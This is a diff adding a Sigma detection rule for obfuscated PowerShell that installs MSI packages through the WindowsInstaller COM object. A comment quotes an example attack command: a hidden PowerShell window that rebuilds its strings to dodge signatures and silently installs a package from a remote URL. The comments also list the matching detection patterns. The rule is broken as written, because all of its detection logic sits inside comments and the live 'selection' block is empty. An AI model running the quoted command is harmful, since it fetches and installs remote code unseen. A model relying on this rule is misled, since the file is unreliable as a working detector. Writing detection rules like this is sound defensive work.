@@ -1,0 +1,36 @@
+title: Obfuscated PowerShell MSI Install via WindowsInstaller COM
+id: 2cad92f9-2cad-4cad-acad-2cad92f90000
+status: stable
+description: Detection rule for MITRE ATT&CK technique T1027.010
+references:
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi.yml
+author: sigma (via IncidentBuddy)
+date: 2026-01-28
+tags:
+  - attack.t1027.010
+logsource:
+  product: windows
+  service: powershell
+detection:
+  selection:
+    # Original sigma detection logic
+    #     # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
+    #     selection_img:
+    #         - Image|endswith:
+    #               - '\powershell_ise.exe'
+    #               - '\powershell.exe'
+    #               - '\pwsh.exe'
+    #         - OriginalFileName:
+    #               - 'PowerShell_ISE.EXE'
+    #               - 'PowerShell.EXE'
+    #               - 'pwsh.dll'
+    #     selection_cli:
+    #         CommandLine|contains|all:
+    #             - '-ComObject'
+    #             - 'InstallProduct('
+    #             - '.Insert('
+    #             - 'UILevel'
+    #     condition: all of selection_*
+    # 
+  condition: selection
+level: medium
